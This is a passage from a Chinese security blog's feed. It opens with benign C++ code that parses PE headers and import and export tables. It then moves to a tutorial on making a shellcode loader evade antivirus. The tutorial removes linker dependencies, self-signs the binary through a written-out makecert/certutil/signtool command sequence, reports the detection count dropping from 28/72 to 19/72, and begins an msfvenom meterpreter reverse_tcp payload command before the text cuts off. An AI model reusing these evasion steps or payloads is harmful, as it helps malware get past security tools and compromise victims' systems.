class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayOptionalHeaderInfo</span><span class="params">(HANDLE ImageBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = <span class="literal">NULL</span>;</span><br><span class="line">    pNtHead = GetNtHead(ImageBase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;魔数(Magic)：                                    %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.Magic);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;链接器的主版本号(MajorLinkerVersion)：           %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MajorLinkerVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;链接器的次版本号(MinorLinkerVersion)：           %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MinorLinkerVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;代码节大小(SizeOfCode)：                         %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfCode);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已初始化数大小(SizeOfInitializedData)：          %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfInitializedData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;未初始化数大小(SizeOfUninitializedData)：        %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfUninitializedData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;最先执行代码起始地址(AddressOfEntryPoint)：      %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;代码基址(BaseOfCode)：                           %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.BaseOfCode);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;数据基址(BaseOfData)：                           %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.BaseOfData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;镜像首地址(ImageBase)：                          %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.ImageBase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;节段在内存中的最小单位(SectionAlignment)：       %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SectionAlignment);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;节段在磁盘文件中的最小单位(FileAlignment)：      %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.FileAlignment);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;主系统的主版本号(MajorOperatingSystemVersion)：  %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MajorOperatingSystemVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;主系统的次版本号(MinorOperatingSystemVersion)：  %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MinorOperatingSystemVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;镜像的主版本号(MajorImageVersion)：              %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MajorImageVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;镜像的次版本号(MinorImageVersion)：              %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MinorImageVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;子系统的主版本号(MajorSubsystemVersion)：        %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MajorSubsystemVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;子系统的次版本号(MinorSubsystemVersion)：        %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.MinorSubsystemVersion);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;保留字段(Win32VersionValue)：                    %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.Win32VersionValue);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;镜像被加载进内存时的大小(SizeOfImage)：          %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfImage);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;所有头的总大小(SizeOfHeaders)：                  %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;镜像文件的校验和(CheckSum)：                     %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.CheckSum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;运行此镜像所需的子系统(Subsystem)：              %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.Subsystem);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DLL标识(DllCharacteristics)：                    %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.DllCharacteristics);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;最大栈大小(SizeOfStackReserve)：                 %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfStackReserve);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始提交的堆栈大小(SizeOfStackCommit)：          %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfStackCommit);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;最大堆大小(SizeOfHeapReserve)：                  %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfHeapReserve);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始提交的局部堆空间大小(SizeOfHeapCommit)：     %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.SizeOfHeapCommit);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;保留字段(LoaderFlags)：                          %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.LoaderFlags);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DataDirectory的数组个数(NumberOfRvaAndSizes)：   %x\n&quot;</span>, pNtHead-&gt;OptionalHeader.NumberOfRvaAndSizes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比两者的值</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/PE/24.png?raw=true" alt="image-20200705194853197"></p><p>输出内容</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/PE/25.png?raw=true" alt="image-20200705194956218"></p><h4 id="获取导入表"><a href="#获取导入表" class="headerlink" title="获取导入表"></a>获取导入表</h4><p>有些文件是没有办法获取到导入表的，但是只要是正常的PE文件的话还是可以获取的</p><p>直接贴代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayImportTable</span><span class="params">(HANDLE ImageBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHead = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pInput = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_THUNK_DATA _pThunk = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwThunk = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwOriginalFirstThunk = <span class="literal">NULL</span>;</span><br><span class="line">    USHORT Hint;</span><br><span class="line">    <span class="keyword">int</span> iSystemBits = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    pDosHead = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">    pNtHead = GetNtHead(ImageBase);</span><br><span class="line">    <span class="comment">//判断版本是32位还是64位</span></span><br><span class="line">    <span class="keyword">if</span> (pNtHead-&gt;FileHeader.Machine== IMAGE_FILE_MACHINE_I386)</span><br><span class="line">    &#123;</span><br><span class="line">        iSystemBits = <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pNtHead-&gt;FileHeader.Machine == (IMAGE_FILE_MACHINE_IA64 || IMAGE_FILE_MACHINE_AMD64))</span><br><span class="line">    &#123;</span><br><span class="line">        iSystemBits = <span class="number">64</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pNtHead-&gt;OptionalHeader.DataDirectory[<span class="number">1</span>].VirtualAddress == <span class="number">0</span>) &#123; <span class="keyword">return</span>; &#125;  <span class="comment">// 读取导入表RVA</span></span><br><span class="line">    pInput = (PIMAGE_IMPORT_DESCRIPTOR)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, pNtHead-&gt;OptionalHeader.DataDirectory[<span class="number">1</span>].VirtualAddress, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">for</span> (; pInput-&gt;Name != <span class="literal">NULL</span>;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span>* szFunctionModule = (PSTR)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (ULONG)pInput-&gt;Name, <span class="literal">NULL</span>);  <span class="comment">// 遍历出模块名称</span></span><br><span class="line">        dwThunk = pInput-&gt;FirstThunk;</span><br><span class="line">        dwOriginalFirstThunk= pInput-&gt;OriginalFirstThunk;</span><br><span class="line">        _pThunk = (PIMAGE_THUNK_DATA)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (ULONG)pInput-&gt;FirstThunk, <span class="literal">NULL</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (; _pThunk-&gt;u1.AddressOfData != <span class="literal">NULL</span>;)</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">char</span>* szFunction = (PSTR)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (ULONG)(((PIMAGE_IMPORT_BY_NAME)_pThunk-&gt;u1.AddressOfData)-&gt;Name), <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (szFunction != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(&amp;Hint, szFunction - <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                Hint = <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (Hint== <span class="literal">NULL</span> || dwThunk == <span class="literal">NULL</span> || dwOriginalFirstThunk == <span class="literal">NULL</span> || szFunctionModule == <span class="literal">NULL</span> || szFunction == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;序号：&quot;</span> &lt;&lt; Hint &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Thunk RVA：&quot;</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; dwThunk &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;OriginalFirstThunk：&quot;</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; dwOriginalFirstThunk &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;DLL名称：&quot;</span> &lt;&lt; szFunctionModule &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;API名称：&quot;</span> &lt;&lt; szFunction &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//32位 +4 64位+8</span></span><br><span class="line">            <span class="keyword">if</span> (iSystemBits == <span class="number">32</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dwThunk += <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (iSystemBits == <span class="number">64</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dwThunk += <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            _pThunk++;</span><br><span class="line">        &#125;</span><br><span class="line">        pInput++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/PE/26.png?raw=true" alt="image-20200713172823169"></p><h4 id="获取导出表"><a href="#获取导出表" class="headerlink" title="获取导出表"></a>获取导出表</h4><p>这个表一般都在DLL文件中所以，这边换了个DLL文件来获取，直接贴代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">DisplayExportTable</span><span class="params">(HANDLE ImageBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pExport;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHead = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = <span class="literal">NULL</span>;</span><br><span class="line">    pDosHead = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">    pNtHead = (PIMAGE_NT_HEADERS)((DWORD)pDosHead + pDosHead-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (pNtHead-&gt;Signature != <span class="number">0x00004550</span>) &#123; <span class="keyword">return</span>; &#125;        <span class="comment">// 无效PE文件</span></span><br><span class="line"></span><br><span class="line">    pExport = (PIMAGE_EXPORT_DIRECTORY)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, pNtHead-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress, <span class="literal">NULL</span>);</span><br><span class="line">    DWORD NumberOfNames = pExport-&gt;NumberOfNames;</span><br><span class="line">    ULONGLONG** ppdwNames = (ULONGLONG**)pExport-&gt;AddressOfNames;</span><br><span class="line">    ppdwNames = (PULONGLONG*)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (ULONG)ppdwNames, <span class="literal">NULL</span>);</span><br><span class="line">    ULONGLONG** ppdwAddr = (ULONGLONG**)pExport-&gt;AddressOfFunctions;</span><br><span class="line">    ppdwAddr = (PULONGLONG*)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (DWORD)ppdwAddr, <span class="literal">NULL</span>);</span><br><span class="line">    ULONGLONG* ppdwOrdin = (ULONGLONG*)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (DWORD)pExport-&gt;AddressOfNameOrdinals, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* szFunction = (PSTR)ImageRvaToVa((PIMAGE_NT_HEADERS)pNtHead, pDosHead, (ULONG)*ppdwNames, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt;<span class="string">&quot;特征值：&quot;</span> &lt;&lt; pExport-&gt;Characteristics &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;时间日期标志：&quot;</span> &lt;&lt;<span class="built_in">std</span>::hex&lt;&lt; pExport-&gt;TimeDateStamp &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//std::cout  &lt;&lt;&quot;大版本号&quot;&lt;&lt; pExport-&gt;MajorVersion &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//std::cout &lt;&lt; &quot;小版本号&quot; &lt;&lt; pExport-&gt;MinorVersion &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;版本号：&quot;</span> &lt;&lt; <span class="built_in">std</span>::hex&lt;&lt;pExport-&gt;MajorVersion &lt;&lt;<span class="string">&quot;.&quot;</span>&lt;&lt;<span class="built_in">std</span>::hex&lt;&lt;pExport-&gt;MinorVersion &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;名称：&quot;</span>&lt;&lt;pExport-&gt;Name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;基址：&quot;</span>&lt;&lt;pExport-&gt;Base &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>  &lt;&lt;<span class="string">&quot;函数个数：&quot;</span>&lt;&lt; pExport-&gt;NumberOfFunctions &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;名称个数：&quot;</span>&lt;&lt; pExport-&gt;NumberOfNames &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;函数地址：&quot;</span> &lt;&lt; pExport-&gt;AddressOfFunctions &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;名称地址：&quot;</span> &lt;&lt; pExport-&gt;AddressOfNames &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;名称序数地址：&quot;</span> &lt;&lt; pExport-&gt;AddressOfNameOrdinals &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; NumberOfNames; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;序号：&quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt;<span class="string">&quot;RVA&quot;</span>&lt;&lt; *ppdwAddr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt;<span class="string">&quot;名称：&quot;</span>&lt;&lt; szFunction &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt;<span class="string">&quot;-----------------------------------&quot;</span>&lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        szFunction = szFunction + <span class="built_in">strlen</span>(szFunction) + <span class="number">1</span>;</span><br><span class="line">        ppdwAddr++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/PE/27.png?raw=true" alt="image-20200713220649317"></p><h4 id="获取重定位表"><a href="#获取重定位表" class="headerlink" title="获取重定位表"></a>获取重定位表</h4><p>这个好像用处不大，到时候有时间写，没时间就算了</p><h4 id="文章用到的源码"><a href="#文章用到的源码" class="headerlink" title="文章用到的源码"></a>文章用到的源码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ascotbe&#x2F;virus&#x2F;tree&#x2F;master&#x2F;PortableExecutableParser</span><br></pre></td></tr></table></figure><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.cppblog.com&#x2F;API&#x2F;archive&#x2F;2011&#x2F;03&#x2F;09&#x2F;141423.html</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;LyShark&#x2F;p&#x2F;11748296.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>恶意程序研究之绕过虚拟机</title>
    <link href="https://www.ascotbe.com/2020/05/21/BypassTheVirtualMachine/"/>
    <id>https://www.ascotbe.com/2020/05/21/BypassTheVirtualMachine/</id>
    <published>2020-05-21T15:00:00.000Z</published>
    <updated>2021-05-04T06:03:28.063Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>新篇章开始了，主要讲一些探测沙盒以及编译工具的方法，之前我写的那个勒索病毒用到的大部分方法我都会总结到这里，也会参考一些师傅的文章，算是一个巩固吧，最后会把所有代码上传到GitHub中，之前免杀里面说的一些像加密之类的操作这里就不在重复写了。</p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/67.png?raw=true" alt="B79A6672434BA2BBDDF34E537B3CD05D" style="zoom:50%;" /><p>这是半成品，还有几个代码没敲完，还有点瑕疵</p><h3 id="从编译角度来看免杀"><a href="#从编译角度来看免杀" class="headerlink" title="从编译角度来看免杀"></a>从编译角度来看免杀</h3><p>全篇文章以免杀中的<strong>VirtualAllocPlanA</strong>作为基础例子来验证我们的猜想，</p><h4 id="删除链接库"><a href="#删除链接库" class="headerlink" title="删除链接库"></a>删除链接库</h4><p>有些反病毒软件会识别链接器中的问题，如果说xxx.lib这些编译器会自动帮我们加上，如果把链接器选项中的其他依赖项删除掉(尤其是<code>kernel32.lib</code>)，某些反恶意软件引擎就不会把生成的可执行文件标记为恶意的。</p><p>这是系统自带的附加依赖，我们生产后放到TV中查杀看看</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/55.png?raw=true" alt="image-20200521150304555"></p><p>可以看到免杀率为<strong>28/72</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/56.png?raw=true" alt="image-20200521150431870"></p><p>接着把附加依赖项删除了，重新生成</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/57.png?raw=true" alt="image-20200521150624346"></p><p>可以看到我们绕过了5家杀软，免杀率<strong>23/72</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/58.png?raw=true" alt="image-20200521150903570"></p><p>知道PE原理的小伙伴可能会说把这个删了文件就无法加载kernel32.dll这个重要的文件了，其实当我们编译的时候vs2019会自动把该dll静态的链接到程序上</p><h4 id="对二进制文件进行签名"><a href="#对二进制文件进行签名" class="headerlink" title="对二进制文件进行签名"></a>对二进制文件进行签名</h4><p>我这里用到<code>makecert</code>，这个软件当你装vs系列的编译器的时候就已经自带了</p><p>位置:vs2019-&gt;工具-&gt;命令行-&gt;里面cmd和powershell随便选一个都行</p><p>用法参数翻译过来如表格</p><table><thead><tr><th>基本选项</th><th>指定主题的证书名称。在双引号中指定此名称，并加上前缀 CN=；例如，”CN=myName”。</th></tr></thead><tbody><tr><td>-pe</td><td>将所生成的私钥标记为可导出。这样可将私钥包括在证书中。</td></tr><tr><td>-sk keyname</td><td>指定主题的密钥容器位置，该位置包含私钥。如果密钥容器不存在，系统将创建一个。</td></tr><tr><td>-sr location</td><td>指定主题的证书存储位置。Location 可以是 currentuser（默认值）或 localmachine。</td></tr><tr><td>-ss store</td><td>指定主题的证书存储名称，输出证书即存储在那里。</td></tr><tr><td>-# number</td><td>指定一个介于 1 和 2,147,483,647 之间的序列号。默认值是由 Makecert.exe 生成的唯一值。</td></tr><tr><td>-$ authority</td><td>指定证书的签名权限，必须设置为 commercial（对于商业软件发行者使用的证书）或 individual（对于个人软件发行者使用的证书）。</td></tr></tbody></table><p>可以使用如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.makecert -r -pe -n <span class="string">&quot;CN=Ascotbe CA&quot;</span> -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv AscotbeCA.pvk AscotbeCA.cer</span><br><span class="line">2.certutil -user -addstore Root AscotbeCA.cer</span><br><span class="line">3.makecert -pe -n <span class="string">&quot;CN=Ascotbe Cert&quot;</span> -a sha256 -cy end -sky signature -ic AscotbeCA.cer -iv AscotbeCA.pvk -sv AscotbeCert.pvk AscotbeCert.cer</span><br><span class="line">4.pvk2pfx -pvk AscotbeCert.pvk -spc AscotbeCert.cer -pfx AscotbeCert.pfx</span><br><span class="line">5.signtool sign /v /f AscotbeCert.pfx /t http://timestamp.verisign.com/scripts/timstamp.dll VirtualAllocPlanA.exe</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/59.png?raw=true" alt="image-20200521155636868"></p><p>可以看到利用证书后又绕过了4家杀软，免杀率<strong>19/72</strong></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/60.png?raw=true" alt="image-20200521155439741"></p><h4 id="使用X64位进行编译"><a href="#使用X64位进行编译" class="headerlink" title="使用X64位进行编译"></a>使用X64位进行编译</h4><p>当前的32位系统以及开始慢慢淘汰了，所以我们可以利用X64位的POC来进行编译，32位的POC已经是重灾区了</p><p>首先用msf生成shellcode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/x64/meterpreter/reverse_tcp -i 6 -b <span 